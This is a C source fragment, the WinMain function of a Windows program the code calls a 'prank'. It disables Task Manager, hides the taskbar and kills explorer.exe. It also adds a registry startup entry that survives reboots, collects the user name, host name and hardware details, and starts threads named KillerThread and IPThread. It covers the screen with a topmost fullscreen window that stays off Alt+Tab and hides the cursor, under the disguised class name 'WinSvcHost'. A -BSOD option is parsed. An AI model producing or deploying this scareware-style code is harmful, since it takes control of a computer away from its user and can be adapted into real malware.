int WINAPI WinMain(HINSTANCE hi,HINSTANCE hp,LPSTR lp,int ns){
    (void)hp;(void)lp;(void)ns;
    srand(GetTickCount());

    /* Parse command line */
    int argc; LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
    BOOL uninstall=FALSE;
    if(argv){ for(int i=1;i<argc;i++){
        if(_wcsicmp(argv[i],L"-Startup")==0)   g_startup=TRUE;
        if(_wcsicmp(argv[i],L"-BSOD")==0)      g_bsod=TRUE;
        if(_wcsicmp(argv[i],L"-Uninstall")==0)  uninstall=TRUE;
    } LocalFree(argv); }

    /* Uninstall mode */
    if(uninstall){
        RemoveStartup(); EnableTM();
        RegDelVal(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N);
        MessageBoxW(NULL,L"Prank removed.",L"Done",MB_OK);
        return 0;
    }

    /* Reboot counter (only when launched from startup entry) */
    if(g_startup){
        int cnt=RegReadInt(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N);
        if(cnt>=MAX_REBOOTS){
            RemoveStartup(); EnableTM();
            RegDelVal(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N);
            return 0;
        }
        RegWriteInt(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N,cnt+1);
        if(cnt+1>=MAX_REBOOTS) RemoveStartup();
    }

    /* Gather system info */
    GetEnvironmentVariableW(L"COMPUTERNAME",g_host,64);
    GetEnvironmentVariableW(L"USERNAME",    g_user,64);
    ULARGE_INTEGER fr,tot,tf;
    if(GetDiskFreeSpaceExW(L"C:\\",&fr,&tot,&tf)){
        ULONGLONG u=(tot.QuadPart-tf.QuadPart)/(1024*1024*1024);
        ULONGLONG t=tot.QuadPart/(1024*1024*1024);
        swprintf(g_disk,64,L"%llu GB / %llu GB",u,t);
    }
    MEMORYSTATUSEX ms={sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    swprintf(g_ram,32,L"%llu GB",ms.ullTotalPhys/(1024*1024*1024));

    /* Admin tasks */
    DisableTM();

    /* Hide taskbar shell */
    g_tb =FindWindowW(L"Shell_TrayWnd",NULL);
    g_tb2=FindWindowW(L"Shell_SecondaryTrayWnd",NULL);
    g_ov =FindWindowW(L"NotifyIconOverflowWindow",NULL);
    if(g_tb)  ShowWindow(g_tb, SW_HIDE);
    if(g_tb2) ShowWindow(g_tb2,SW_HIDE);
    if(g_ov)  ShowWindow(g_ov, SW_HIDE);

    /* Kill explorer (removes taskbar shell entirely) */
    {HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
     if(snap!=INVALID_HANDLE_VALUE){
         PROCESSENTRY32W pe={sizeof(pe)};
         if(Process32FirstW(snap,&pe)) do {
             if(_wcsicmp(pe.szExeFile,L"explorer.exe")==0){
                 HANDLE hp2=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
                 if(hp2){TerminateProcess(hp2,1);CloseHandle(hp2);}
             }
         } while(Process32NextW(snap,&pe));
         CloseHandle(snap);
     }}

    /* Install startup persistence (first run only) */
    if(!g_startup){
        RegWriteInt(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N,0);
        InstallStartup();
    }

    /* Background threads */
    HANDLE hk=CreateThread(NULL,0,KillerThread,NULL,0,NULL);
    HANDLE hb2=CreateThread(NULL,0,BeepThread, NULL,0,NULL);
    HANDLE hip=CreateThread(NULL,0,IPThread,   NULL,0,NULL);
    if(hk)  CloseHandle(hk);
    if(hb2) CloseHandle(hb2);
    if(hip) CloseHandle(hip);

    /* Screen dimensions */
    SW=GetSystemMetrics(SM_CXSCREEN);
    SH=GetSystemMetrics(SM_CYSCREEN);

    /* Register window class */
    WNDCLASSEXW wc={sizeof(wc)};
    wc.lpfnWndProc=WndProc; wc.hInstance=hi;
    wc.lpszClassName=L"WinSvcHost";
    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor=NULL;
    RegisterClassExW(&wc);

    /* Create fullscreen window — WS_EX_TOOLWINDOW keeps it off taskbar + Alt+Tab */
    HWND hw=CreateWindowExW(
        WS_EX_TOOLWINDOW|WS_EX_TOPMOST,
        L"WinSvcHost",L"",WS_POPUP,
        0,0,SW,SH,NULL,NULL,hi,NULL);
    ShowWindow(hw,SW_SHOW);
    UpdateWindow(hw);
    ShowCursor(FALSE);   /* cursor gone */

    /* Message loop */
    MSG msg;
    while(GetMessageW(&msg,NULL,0,0)>0){
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    /* Final cleanup if not already done */
    if(!g_done){
        g_done=TRUE;
        RestoreShell();
        RemoveStartup();
        RegDelVal(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N);
        ShowCursor(TRUE);
    }
    return 0;
}
